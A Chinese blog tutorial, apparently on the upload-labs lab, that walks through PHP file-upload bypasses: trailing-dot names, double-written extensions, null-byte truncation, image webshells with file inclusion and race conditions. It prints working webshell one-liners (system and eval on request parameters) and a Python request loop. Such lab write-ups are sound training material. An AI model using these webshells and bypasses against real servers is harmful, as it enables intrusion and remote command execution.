<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200405083545100.png" alt="image-20200405083719450"></p>
<p>复制当前图片连接，使用菜刀或者蚁剑连接php脚本，将::$DATA特殊符号删除，进行连接，aaa是当时webshell中设置的密码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200405083719450.png" alt="image-20200405083545100"></p>
<p>成功连接</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200405083944908.png" alt="image-20200405083944908"></p>
<h4 id="绕过黑名单验证-路径拼接绕过"><a href="#绕过黑名单验证-路径拼接绕过" class="headerlink" title="绕过黑名单验证(路径拼接绕过)"></a>绕过黑名单验证(路径拼接绕过)</h4><h5 id="1、路径拼接绕过原理"><a href="#1、路径拼接绕过原理" class="headerlink" title="1、路径拼接绕过原理"></a>1、路径拼接绕过原理</h5><p>在没有对上传的文件进行重命名的请胯下，用户可以自定义文件名并在服务器上传新建，就会造成对应的绕过黑名单</p>
<p>例如：</p>
<p>用户新建    1.php.+空格+.</p>
<p>deldot删除最后一个点之后，不再进行删除，trim删除空格，那么最终上传的文件名为1.php.。</p>
<p>利用windows特性自动去除最后一个点，导致上传成功</p>
<p>所谓路径拼接，就是文件名直接拼接到上传的路径当中</p>
<h5 id="2、基于黑名单验证码代码分析"><a href="#2、基于黑名单验证码代码分析" class="headerlink" title="2、基于黑名单验证码代码分析"></a>2、基于黑名单验证码代码分析</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (isset($_POST[&#39;submit&#39;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext &#x3D; array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);</span><br><span class="line">        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);</span><br><span class="line">        $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点</span><br><span class="line">        $file_ext &#x3D; strrchr($file_name, &#39;.&#39;);</span><br><span class="line">        $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写</span><br><span class="line">        $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA</span><br><span class="line">        $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;首尾去空</span><br><span class="line">        </span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123;</span><br><span class="line">            &#x2F;&#x2F; 我们上传的文件没有进行随机化重命名，而是直接将对应文件名拼接到最终的路径下进行上传</span><br><span class="line">                $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; . $file_name;</span><br><span class="line">                $is_upload &#x3D; true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg &#x3D; &#39;此文件不允许上传&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="3、修改文件名-绕过黑名单验证"><a href="#3、修改文件名-绕过黑名单验证" class="headerlink" title="3、修改文件名 绕过黑名单验证"></a>3、修改文件名 绕过黑名单验证</h5><p>因为Windows特性不能再Windows下修改文件名为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">例如：</span><br><span class="line">file.php. .</span><br></pre></td></tr></table></figure>

<p>需要在kali中修改</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200405101158548.png" alt="image-20200405101235839"></p>
<p>上传拼接文件，返回空白图片</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200405101235839.png" alt="image-20200405101158548"></p>
<p>选择图片的图片地址，在新的页面打开，因为我上传的php代码里面是phpinfo所以会返回phpinfo的内容</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200405101354885.png" alt="image-20200405101432318"></p>
<p>在查看upload下是否有file.php文件</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200405101432318.png" alt="image-20200405101354885"></p>
<p>这样的一个绕过，只适用于Windows系统，并且当前的文件名没有被重命名，而是直接使用用户上传的文件名，这时候用户文件名是一个可控状态</p>
<h5 id="4、上传小WebShell-小马-，大WebShell-大马"><a href="#4、上传小WebShell-小马-，大WebShell-大马" class="headerlink" title="4、上传小WebShell(小马)，大WebShell(大马)"></a>4、上传小WebShell(小马)，大WebShell(大马)</h5><p>上传WebShell，可以绕过上传过程中对文件大小等限制，从而能够更加有效上传大WebShell</p>
<p>在某些情况下，会对文件上传的大小做一些限制，为了突破这个限制，先上传小WebShell(小马)，也就是它本身就是一个可以上传WebShell的上传界面，而它的上传界面当中对应的代码对比相对的大WebShell(大马)，小很多。</p>
<p>通过缩减对应的字节数，从而达到符合对应的上传的限制，然后进行上传小WebShell，上传之后小WebShell是没有做限制的，这个时候就可以利用小WebShell上传更大的WebShell，从而突破文件上传工程中对文件大小的限制，以及其他限制</p>
<p>这是小马，代码量比较少</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200405102809065.png" alt="image-20200405102809065"></p>
<p>进行上传，返回空白图片，右键复制网页地址，在新的页面打开</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200405103811317.png" alt="image-20200405103912957"></p>
<p>打开网页地址，成功上传了小马</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200405103912957.png" alt="image-20200405104442201"></p>
<p>在进行上传大马，打开大马，复制其中内容Ctrl+A进行全部选取，Ctrl+C复制</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200405104442201.png" alt="image-20200405103811317"></p>
<p>复制到小马的上传文本框中，将之前的xiaoma.php改名为dama.php(起什么名字无所谓，只要不适合xiaomaphp相同就行)，点击create</p>
<p>注意：因为如果不改名的话就会将大马的内容上传到之前小马的php文件中</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200405105229631.png" alt="image-20200405105229631"></p>
<p>返回ok表示上传成功，这样就说明大马成功上传了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200405105415021.png" alt="image-20200405192815485"></p>
<p>查看站点根目录，这样就有了dama.php</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200405105448859.png" alt="image-20200405105448859"></p>
<p>访问大马出现报错</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200405112056011.png" alt="image-20200405192902724"></p>
<p>因为之前小马中使用了utf-8的原因，我们将小马的编码删除，在按照以上的方式来上传一遍</p>
<h4 id="绕过黑名单验证-双写绕过"><a href="#绕过黑名单验证-双写绕过" class="headerlink" title="绕过黑名单验证(双写绕过)"></a>绕过黑名单验证(双写绕过)</h4><p>upload-labs第十关</p>
<h5 id="1、双写绕过原理"><a href="#1、双写绕过原理" class="headerlink" title="1、双写绕过原理"></a>1、双写绕过原理</h5><p>代码编写过程中，支队黑名单中的内容进行空替换，因为只替换一次所造成的双写绕过</p>
<p>例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.ph   php  p</span><br><span class="line">进行对应的空替换时，会首先发现php，将其过滤，过滤之后因为中间的php没有了，后面的p补上来，又变成了一个php文件，从而达到绕过。</span><br></pre></td></tr></table></figure>

<h5 id="2、基于黑名单验证代码分析-1"><a href="#2、基于黑名单验证代码分析-1" class="headerlink" title="2、基于黑名单验证代码分析"></a>2、基于黑名单验证代码分析</h5><p>str_ireplace()函数替换字符串中的一些字符(不区分大小写)。</p>
<p>该函数必须遵循下列规则</p>
<ul>
<li>如果搜索的字符串是一个数组，那它将返回一个数组</li>
<li>如果搜索的字符串是一个数组，那么它将对数组中的每一个元素进行查找和替换</li>
<li>如果同时需要对数组进行查找和替换，并且需要执行替换的元素少于查询到的元素数量，那么多余的元素将用空字符进行替换</li>
<li>如果是对一个数组进行查找，但只是对一个字符串进行替换，那么替代字符串将对所有查找到的值起作用。</li>
<li>注释：该函数不区分大小写。请使用str_replace()函数来执行区分大小写的搜索。</li>
<li>注释：该函数是二进制安全的</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (isset($_POST[&#39;submit&#39;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext &#x3D; array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;);</span><br><span class="line"></span><br><span class="line">        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);</span><br><span class="line">        &#x2F;&#x2F; 这里使用str_ireplace()函数，这个函数的意思是，只替换一次，并且为空。</span><br><span class="line">        &#x2F;&#x2F; 将$file_name中符合$deny_ext黑名单中的后缀名替换为空</span><br><span class="line">        $file_name &#x3D; str_ireplace($deny_ext,&quot;&quot;, $file_name);</span><br><span class="line">        if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $file_name)) &#123;</span><br><span class="line">            $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; .$file_name;</span><br><span class="line">            $is_upload &#x3D; true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="3、绕过黑名单验证"><a href="#3、绕过黑名单验证" class="headerlink" title="3、绕过黑名单验证"></a>3、绕过黑名单验证</h5><p>将文件进行双写,例如：one.pphphp</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200405192815485.png" alt="image-20200405193016113"></p>
<p>选择文件进行上传，发现返回空白图片，复制图片地址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200405192902724.png" alt="image-20200405112056011"></p>
<p>将复制的图像地址在菜刀或者蚁剑打开，成功上传</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200405193016113.png" alt="image-20200405105415021"></p>
<h4 id="绕过白名单验证-00截断绕过"><a href="#绕过白名单验证-00截断绕过" class="headerlink" title="绕过白名单验证(00截断绕过)"></a>绕过白名单验证(00截断绕过)</h4><h5 id="1、00截断原理"><a href="#1、00截断原理" class="headerlink" title="1、00截断原理"></a>1、00截断原理</h5><p>0x00是十六进制表示方法，是ascii码为0的字符，在有些和函数处理时，会把这个字符当做结束符</p>
<p>系统在对文件名的读取时，如果遇到0x00，就会认为读取已结束</p>
<p>在PHP5.3之后的版本中完全修复了00截断。并且00截断受限于GPC，addslashes函数</p>
<p>白名单验证就是指定的文件后缀名，比如只允许jpg、png等文件上传，进行文件上传时，只有后缀名符合这两个后缀名才允许上传，这就是白名单</p>
<h5 id="00字符截断的问题不只是在文件上传漏洞中有所利用，因为这是一个被广泛应用于字符串处理函数的保留字符，因此在各种不同的业务逻辑中都有可能出现问题，需要引起重视。"><a href="#00字符截断的问题不只是在文件上传漏洞中有所利用，因为这是一个被广泛应用于字符串处理函数的保留字符，因此在各种不同的业务逻辑中都有可能出现问题，需要引起重视。" class="headerlink" title="%00字符截断的问题不只是在文件上传漏洞中有所利用，因为这是一个被广泛应用于字符串处理函数的保留字符，因此在各种不同的业务逻辑中都有可能出现问题，需要引起重视。"></a>%00字符截断的问题不只是在文件上传漏洞中有所利用，因为这是一个被广泛应用于字符串处理函数的保留字符，因此在各种不同的业务逻辑中都有可能出现问题，需要引起重视。</h5><p>而白名单在进行验证时可以直接在后面输入00</p>
<p>比如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">再上传过程中它是一个jpg文件，但是在.php后面有0x00截断，.jpg忽略，这样就成功上传了1.php</span><br><span class="line">1.php0x00.jpg</span><br><span class="line">00后面的内容都将被忽略，但是在整个过程中，他的文件名还是依然存在</span><br></pre></td></tr></table></figure>

<h5 id="2、GET型00截断"><a href="#2、GET型00截断" class="headerlink" title="2、GET型00截断"></a>2、GET型00截断</h5><p>GET型提交的内容会被自动进行URL解码。</p>
<p><strong>注意：</strong>进行00截断一定要关闭<strong>GPC</strong>，否则无法成功。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if(isset($_POST[&#39;submit&#39;]))&#123;</span><br><span class="line">    $ext_arr &#x3D; array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);</span><br><span class="line">    $file_ext &#x3D; substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1);</span><br><span class="line">    if(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];</span><br><span class="line">      &#x2F;&#x2F; date()随机数和rand()时间，以及最后添加文件扩展名$file_ext</span><br><span class="line">      &#x2F;&#x2F; 这样就可以在date(&quot;YmdHis&quot;)后面加入0x00截断，使$file_ext被添加的文件后缀名不会被执行成功</span><br><span class="line">        $img_path &#x3D; $_GET[&#39;save_path&#39;].&quot;&#x2F;&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br><span class="line">	&#x2F;&#x2F; 使用move_uploaded_file将临时上传的文件$temp_file保存到$img_path路径下，并且进行了随机化重命名</span><br><span class="line">        if(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload &#x3D; true;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $msg &#x3D; &#39;上传失败！&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        $msg &#x3D; &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先新建一个1.php的文件，将其里面写入一句话木马</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406081237206.png" alt="image-20200406083446465"></p>
<p>写入一句话木马后，在将文件改名为1.jpg或者png只要是允许上传的文件格式就可以</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406083134693.png" alt="image-20200406081237206"></p>
<p>进行上传，使用burp抓包，然后将burp中的信息进行稍微修改</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406083446465.png" alt="image-20200406083134693"></p>
<p>修改完成后运行包通过，页面会返回空白图片，右击点击图片地址。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406083622923.png" alt="image-20200406083622923"></p>
<p>在新的页面将地址粘贴，粘贴完不能直接执行，需要将红线处的内容删除，也就是1.php后的内容删除，否则报错</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406083751706.png" alt="image-20200406084954651"></p>
<p>删除之后在进入页面，返回phpinof的页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406083843607.png" alt="image-20200406085245844"></p>
<p>这就是GTE截断。</p>
<h5 id="3、POST型00截断"><a href="#3、POST型00截断" class="headerlink" title="3、POST型00截断"></a>3、POST型00截断</h5><p>除了常见的检查文件名后缀的方法外，有的应用，还会通过判断上传文件的文件头来验证文件的类型。比如以下代码</p>
<p>在POST请求中，%00不会被自动解码，需要在16进制中进行修改00</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if(isset($_POST[&#39;submit&#39;]))&#123;</span><br><span class="line">    $ext_arr &#x3D; array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);</span><br><span class="line">    $file_ext &#x3D; substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1);</span><br><span class="line">    if(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];</span><br><span class="line">     &#x2F;&#x2F; 这样就可以在date(&quot;YmdHis&quot;)后面加入0x00截断，使$file_ext被添加的文件后缀名不会被执行成功</span><br><span class="line">        $img_path &#x3D; $_POST[&#39;save_path&#39;].&quot;&#x2F;&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br><span class="line">        </span><br><span class="line">	&#x2F;&#x2F; 使用move_uploaded_file将临时上传的文件$temp_file保存到$img_path路径下，并且进行了随机化重命名</span><br><span class="line">        if(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload &#x3D; true;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $msg &#x3D; &quot;上传失败&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        $msg &#x3D; &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>创建一个php文件，写入一句话木马，然后更改为可上传格式，进行上传burp抓包</p>
<p>这里加入空格的原因是因为%00不会被自动解码，需要在16进制中修改，因为加入空格已知他是16进制的20，所以在HEX只需要找到位置将20修改为00就可以截断</p>
<p>为了绕过类似的MIME Sniff的功能，常见的攻击技巧是伪造一个合法的文件头，而将真实的PHP等脚本代码附在合法的文件头之后</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406084954651.png" alt="image-20200406083751706"></p>
<p>在HEX子模块中找到1.php空格，找到20</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406085245844.png" alt="image-20200406083843607"></p>
<p>找到20之后，要将他修改为00</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406085344970.png" alt="image-20200406085759324"></p>
<p>修改执行点击forward进行上传，返回一个空白图片，右键复制图片连接</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406085602285.png" alt="image-20200406085602285"></p>
<p>在新的浏览器打开，当然还是需要将php格式后面的删除，成功访问</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406085759324.png" alt="image-20200406085344970"></p>
<p><strong>注意：</strong>截断需要关闭GPC否则会上传失败</p>
<h5 id="4、一句话代码执行Webshell"><a href="#4、一句话代码执行Webshell" class="headerlink" title="4、一句话代码执行Webshell"></a>4、一句话代码执行Webshell</h5><p>使用php中的函数system执行GET提交的参数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	&#x2F;&#x2F; 当参数不为空时，执行if下的语句</span><br><span class="line">	&#x2F;&#x2F; 当if判断输入为空时，执行else语句</span><br><span class="line">		if($_GET)&#123;</span><br><span class="line">				$cmd&#x3D;$_GET[&quot;cmd&quot;];</span><br><span class="line">				system($cmd);</span><br><span class="line">		&#125;else&#123;</span><br><span class="line">				echo &quot;no cmd&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>因为我们并没有提交任何参数，所以返回为no cmd为空</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406090751572.png" alt="image-20200406090948967"></p>
<p>如果写入cmd=ipconfig，会返回ipconfig的详细信息</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406090948967.png" alt="image-20200406090751572"></p>
<p>如果上感觉太乱，可以查看源码，这样就会整齐的列下来</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406091058283.png" alt="image-20200406094728548"></p>
<p>在某些时候JS会限制右键，可以使用   “<strong>view-source:URL</strong>”   来查看源代码</p>
<p>例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">view-source:http:&#x2F;&#x2F;127.0.0.1&#x2F;upload-labs&#x2F;upload&#x2F;web.php?cmd&#x3D;ipconfig</span><br></pre></td></tr></table></figure>

<h4 id="图片WebShell上传"><a href="#图片WebShell上传" class="headerlink" title="图片WebShell上传"></a>图片WebShell上传</h4><h5 id="1、图片WebShell制作"><a href="#1、图片WebShell制作" class="headerlink" title="1、图片WebShell制作"></a>1、图片WebShell制作</h5><p>在服务端的PHP代码中，对于用户上传的文件做文件类型检查，查看文件格式是否符合上传规范。可以检查文件二进制格式的前几个字节，从而判断文件类型是否正确。</p>
<p>新建php文件将其写入代码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406094531954.png" alt="image-20200406095152978"></p>
<p>将PHP格式改为jpg格式</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406094728548.png" alt="image-20200406091058283"></p>
<h5 id="2、上传图片WebShell文件"><a href="#2、上传图片WebShell文件" class="headerlink" title="2、上传图片WebShell文件"></a>2、上传图片WebShell文件</h5><p>将制作好的图片WebShell上传到服务器。</p>
<p>其中可能Content-Type验证。修改为image/gif或者image/jpg 符合当前文件类型的MIME</p>
<p>进行上传然后使用Burp抓包，Forward进行放行</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406095120594.png" alt="image-20200406094531954"></p>
<p>返回空白图片，复制图片地址，在新的页面打开</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406095152978.png" alt="image-20200406095225081"></p>
<p>发现页面打开，但是并没有phpinfo的界面，说明出错了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406095225081.png" alt="image-20200406095120594"></p>
<p>因为文件我们直接编写的，他没有直接显示，这样的话他还是没有直接显示对应的phpinfo，对于这种情况就要使用对用的文件包含漏洞进行对应的测试，才能执行对应的phpinfo</p>
<h5 id="3、文件包含漏洞代码分析"><a href="#3、文件包含漏洞代码分析" class="headerlink" title="3、文件包含漏洞代码分析"></a>3、文件包含漏洞代码分析</h5><p>在PHP中，使用include、require、include_once、require_once函数包含的文件都会被当做PHP代码执行，无论文件的名称是什么，只要符号文件内容符合PHP代码规范，都会被当作PHP代码执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">		if($_GET)&#123;</span><br><span class="line">				include($_GET[&quot;file&quot;]);</span><br><span class="line">		&#125;</span><br><span class="line">		else&#123;</span><br><span class="line">				echo &quot;not get args file&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h5 id="4、结合文件包含输出phpinfo"><a href="#4、结合文件包含输出phpinfo" class="headerlink" title="4、结合文件包含输出phpinfo"></a>4、结合文件包含输出phpinfo</h5><p>将上面代码放在upload下，将地址复制打开，返回not get args file，说明代码没问题</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406101945790.png" alt="image-20200406104838474"></p>
<p>在php后面加上?file=一句话木马的图片名称，将红线处的图片名称复制到蓝线处</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406102158810.png" alt="image-20200406102158810"></p>
<p>利用存在文件包含的PHP页面，包含上传的图片WebShell，从而触发WebShell，输出对应的phpinfo</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406101824355.png" alt="image-20200406111040176"></p>
<h4 id="竞争条件"><a href="#竞争条件" class="headerlink" title="竞争条件"></a>竞争条件</h4><p>upload-labs 17</p>
<h5 id="1、文件上传过程介绍"><a href="#1、文件上传过程介绍" class="headerlink" title="1、文件上传过程介绍"></a>1、文件上传过程介绍</h5><p>文件上传过程：</p>
<p>从浏览器上传到服务器，服务器接收到浏览器上传的文件时，服务器就会获取对应的文件，获取文件之后他不会立即将文件保存到对应的网站目录下，而是会将他保存到系统的临时文件当中，保存到临时文件之后，当我们在对应的脚本当中使用对应的重命名函数时，才会将临时文件移动到我们对应的上传目录下</p>
<p>例如：我们在php脚本语言当中使用move_uploade这个函数之后，才会将文件真实的上传到咱们对应的站点目录下。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406104838474.png" alt="image-20200406101945790"></p>
<h5 id="2、竞争条件原理介绍"><a href="#2、竞争条件原理介绍" class="headerlink" title="2、竞争条件原理介绍"></a>2、竞争条件原理介绍</h5><p>网站逻辑：</p>
<p>1、网站允许上传任意文件，然后检查上传文件是否包含WebShell，如果包含删除该文件</p>
<p>2、网站允许上传任意文件，但是如果不是指定类型，那么使用unlink删除文件</p>
<p>问题：</p>
<p>在删除之前如果访问到上传的php文件或者其他脚本文件，从而执行上传中的php代码或者其他脚本代码</p>
<p>例如：上传文件代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[&quot;cmd&quot;])?&gt;&#39;);</span><br><span class="line">?&gt;</span><br><span class="line">假如以上代码命名为WebShell.php，那么再删除WebShell.php时，首先访问了WebShell.php，这时候就会在相应的WebShell.php当前目录下新建一个shell.php一句话脚本，从而可以使用菜刀进行连接</span><br><span class="line"></span><br><span class="line">通俗点说就是当你上传完WebShell.php文件，网站要检查你这个文件是不是包含了恶意脚本，检查的时候需要打开WebShell.php文件，当打开的时候就执行了php脚本，因为检查和删除是需要时间的，所以就在这个时间段内生成了一个shell.php脚本，将&lt;?php @eval($_POST[&quot;cmd&quot;])?&gt;这段代码放进了 shell.php中，这样就可以使用菜刀连接了</span><br></pre></td></tr></table></figure>

<h5 id="3、竞争条件代码分析"><a href="#3、竞争条件代码分析" class="headerlink" title="3、竞争条件代码分析"></a>3、竞争条件代码分析</h5><p>先进行上传，然后进行判断与删除，利用时间差进行WebShell上传。</p>
<p>首先进行了对应的上传，上传之后才进行判断，判断上传的文件是否符合对应的条件，符合类型为jpg，png，gif，如果符合使用rename()函数进行重命名，如果不符合使用unlink()函数进行删除，这个时候就可以利用判断和删除的时间差来进行对应的webshell上传，从而访问到上传的php脚本</p>
<p>因为在move_uoloaded_file(){函数后面那里并没有进行判断，这个时候就可因进行上传比如一个1.php，网站在删除之前访问到1.php，那么1.php脚本当中内容就会执行</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406111040176.png" alt="image-20200406101824355"></p>
<h5 id="4、竞争条件文件上传利用"><a href="#4、竞争条件文件上传利用" class="headerlink" title="4、竞争条件文件上传利用"></a>4、竞争条件文件上传利用</h5><p>提前不断访问代码文件，然后上传，最终使用才到连接一句话webshell</p>
<p>Python发送http请求：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import   requests</span><br><span class="line">while   true:</span><br><span class="line">		requests.get(&quot;路径&quot;)</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406170912193.png" alt="image-20200406131948511"></p>
<p>使用单一测试速度达不到，无法在删除之前进行对应的访问，为了达成实验目的，在删除之前加一个sleep进行延迟，时间延迟5秒</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406131948511.png" alt="image-20200406170739475"></p>
<p>先查看upload，发现upload下没有任何文件</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406170739475.png" alt="image-20200406170957931"></p>
<p>先执行text.py，使用python脚本进行不断地发送http请求，连接webshell.php</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200406170957931.png" alt="image-20200406170912193"></p>
<p>在kali中进行对应的上传</p>
<p>wireshark下查看可以看到不断地请求webshell.php</p>
<p><img src="/2020/04/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload%5Cimage-20200407164143221.png" alt="image-20200407164143221"></p>
